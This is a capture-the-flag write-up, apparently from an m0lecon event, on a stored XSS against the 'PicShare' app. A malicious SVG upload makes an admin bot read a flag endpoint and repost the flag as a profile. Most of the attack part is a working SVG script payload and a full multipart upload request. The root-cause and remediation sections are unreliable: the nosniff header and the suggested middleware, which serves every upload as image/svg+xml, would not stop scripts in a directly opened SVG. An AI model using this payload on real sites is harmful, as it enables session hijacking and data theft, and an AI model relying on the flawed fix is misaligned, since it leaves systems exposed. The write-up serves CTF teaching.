### PicShare - Stored XSS via SVG Upload and Missing X-Content-Type-Options

> x Exam (53)


#### Vulnerability Class

> **Stored Cross-Site Scripting via SVG file upload**, enabled by the absence of the `X-Content-Type-Options: nosniff` response header on uploaded files. When an SVG document is served without this header and opened directly in a browser, it is rendered as an active XML document capable of executing embedded `<script>` elements in the serving origin's context, granting full access to authenticated endpoints and session cookies.

#### Attack Surface Identification

Inspection of the page source revealed four critical observations.

**First**, the `escapeHtml()` function is correctly implemented using a DOM-based approach, meaning text fields are not injectable:

```javascript
function escapeHtml(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}
```

**Second**, the profile wall renders a direct link to each avatar file using `target="_blank"`, opening it as a standalone document in the browser:

```javascript
const directLink = p.avatar
  ? `<a href="${escapeHtml(p.avatar)}" target="_blank" class="avatar-link" title="Open avatar directly">&#x1F517;</a>`
  : '';
```

**Third**, the footer contains the explicit hint `No X-Content-Type-Options`, directly signaling that uploaded files are served without the `X-Content-Type-Options: nosniff` header, meaning the browser will render an `.svg` file as an active SVG document rather than treating it as an opaque image binary.

**Fourth**, a **Report a Profile to Admin** section submits a URL to `POST /report`, causing the admin bot running headless Chromium to visit that URL with its authenticated session cookies attached.

#### Understanding the SVG as an XSS Vector

> An SVG file is a valid XML document conforming to the W3C SVG specification. The SVG specification explicitly permits embedded `<script>` elements, which browsers execute when the SVG is rendered as a document rather than as an image. When an SVG is embedded via an `<img>` tag, scripts are suppressed. However, when an SVG is opened directly as a top-level document, either by navigating to its URL or opening it via `target="_blank"`, all embedded scripts execute in the full origin context of the serving domain, with unrestricted access to `document.cookie`, the `fetch` API, and all same-origin endpoints.

The absence of `X-Content-Type-Options: nosniff` is the enabling condition: without it, even if the server serves the SVG with `Content-Type: image/svg+xml`, the browser will render it as a full document when navigated to directly.

#### Exploitation

##### Step 1: Uploading the Malicious SVG

The profile creation endpoint at `POST /api/profiles` accepts a `multipart/form-data` request with `name`, `bio`, and `avatar` fields. The server uses the original filename extension to determine the stored file path, meaning a file uploaded with `filename="payload.svg"` is stored and served as an `.svg` file. The `Content-Type` header in the multipart part is not used for extension determination.

The initial payload uploaded a simple fetch chain:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch(`/admin/api/flag`, {credentials:`include`})
      .then(r=>r.text())
      .then(flag=>{
        const fd = new FormData();
        fd.append(`name`, `FLAG`);
        fd.append(`bio`, flag);
        fd.append(`avatar`, new Blob([`<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>`], {type:`image/svg+xml`}), `x.svg`);
        fetch(`/api/profiles`, {method:`POST`, body:fd});
      })
  </script>
</svg>
```

This was uploaded via Burp Repeater as follows:

```http
POST /api/profiles HTTP/2
Host: 638b9c0e-aa8e-48ff-96bb-c26b872ccac9.offsec.m0lecon.it
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvGj0xPRH0yfv1On6

------WebKitFormBoundaryvGj0xPRH0yfv1On6
Content-Disposition: form-data; name="name"

test
------WebKitFormBoundaryvGj0xPRH0yfv1On6
Content-Disposition: form-data; name="bio"

test
------WebKitFormBoundaryvGj0xPRH0yfv1On6
Content-Disposition: form-data; name="avatar"; filename="payload.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch(`/admin/api/flag`, {credentials:`include`})
      .then(r=>r.text())
      .then(flag=>{
        const fd = new FormData();
        fd.append(`name`, `FLAG`);
        fd.append(`bio`, flag);
        fd.append(`avatar`, new Blob([`<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>`], {type:`image/svg+xml`}), `x.svg`);
        fetch(`/api/profiles`, {method:`POST`, body:fd});
      })
  </script>
</svg>
------WebKitFormBoundaryvGj0xPRH0yfv1On6--
```

The server response assigned the avatar path `/uploads/0d74f339c6047dfc.svg`.

##### Step 2: Why credentials: include Is Required

An initial version of the payload omitted `credentials: 'include'`, causing the fetch to `/admin/api/flag` to return `{"error":"Forbidden — admins only."}`. This occurred because `fetch()` by default does not attach cookies to cross-origin requests, and even for same-origin requests issued from within a standalone SVG document, explicit credential inclusion is required in some browser contexts. Adding `{credentials: 'include'}` ensures the admin bot's session cookie is attached to the request, satisfying the authentication check on the `/admin/api/flag` endpoint.

##### Step 3: Why FormData Is Required for Exfiltration

The `/api/profiles` endpoint enforces that the `avatar` field must contain an uploaded file, rejecting JSON POST requests with `{"error":"An avatar image is required."}`. A simple `fetch('/api/profiles', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({...}) })` therefore fails silently from the bot's perspective. The solution is to construct a `FormData` object programmatically in JavaScript, appending a minimal SVG `Blob` as the avatar file, allowing the flag text to be stored as the `bio` field of a new profile:

```javascript
const fd = new FormData();
fd.append(`name`, `FLAG`);
fd.append(`bio`, flag);
fd.append(`avatar`, new Blob(
  [`<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>`],
  {type:`image/svg+xml`}
), `x.svg`);
fetch(`/api/profiles`, {method:`POST`, body:fd});
```

##### Step 4: Triggering the Attack via the Report Endpoint

The direct avatar URL was submitted to the **Report a Profile to Admin** form:

```
https://638b9c0e-aa8e-48ff-96bb-c26b872ccac9.offsec.m0lecon.it/uploads/0d74f339c6047dfc.svg
```

The admin bot navigated to this URL, the browser rendered the SVG as an active document in the application origin, the embedded script executed, fetched `/admin/api/flag` with the admin's session credentials, and posted the flag text as a new profile entry titled **FLAG**.

##### Step 5: Recovering the Flag

Refreshing the main page revealed a new profile entry titled **FLAG** in the profile wall with the flag content in its bio field.

#### Full Attack Chain Summary

```
Attacker uploads payload.svg via POST /api/profiles
        |
        v
Server stores file at /uploads/0d74f339c6047dfc.svg (no content validation)
        |
        v
Attacker reports SVG URL to POST /report
        |
        v
Admin bot navigates to /uploads/0d74f339c6047dfc.svg
        |
        v
Browser renders SVG as active document in application origin
(no X-Content-Type-Options header to prevent this)
        |
        v
Embedded <script> executes fetch(/admin/api/flag, {credentials:include})
        |
        v
Admin session cookie attached → 200 OK response with flag text
        |
        v
Script constructs FormData with flag as bio, posts to /api/profiles
        |
        v
Attacker refreshes wall → reads FLAG profile bio → flag recovered
```

#### Root Cause Analysis

> The vulnerability has two independent root causes. The primary flaw is the **absence of `X-Content-Type-Options: nosniff`** on uploaded file responses, allowing the browser to render `.svg` uploads as active documents rather than inert image binaries. The secondary flaw is the **lack of server-side file content validation**: the server accepts any file content as long as the extension is `.svg`, without parsing or sanitizing the SVG XML to strip embedded `<script>` elements. Either fix independently would have prevented the attack.

#### Remediation

Two independent remediations are required, either of which alone would prevent this attack.

**Remediation 1:** Add `X-Content-Type-Options: nosniff` to all responses serving uploaded files, preventing the browser from rendering SVGs as active documents:

```javascript
// Express middleware for uploaded file responses
app.use('/uploads', (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Type', 'image/svg+xml');
  next();
});
```

**Remediation 2:** Sanitize uploaded SVG files server-side by parsing the XML and stripping all `<script>` elements and event handler attributes before storage, using a library such as `DOMPurify` with a jsdom environment or `svg-sanitizer`:

```javascript
const { JSDOM } = require('jsdom');
const DOMPurify = require('dompurify')(new JSDOM('').window);

const cleanSvg = DOMPurify.sanitize(svgContent, {
  USE_PROFILES: { svg: true, svgFilters: true }
});
```

**Remediation 3:** Serve all uploaded files from a **separate origin or subdomain** entirely isolated from the application origin, ensuring that even if an SVG executes scripts, those scripts cannot access cookies or endpoints belonging to the main application domain.


<img src="_attachments/PicShare%20-%20XSS%20via%20SVG%20Avatar%20Upload%20and%20Content-Type%20Sniffing_1.png" width="300">

<img src="_attachments/PicShare%20-%20XSS%20via%20SVG%20Avatar%20Upload%20and%20Content-Type%20Sniffing.png" width="300">

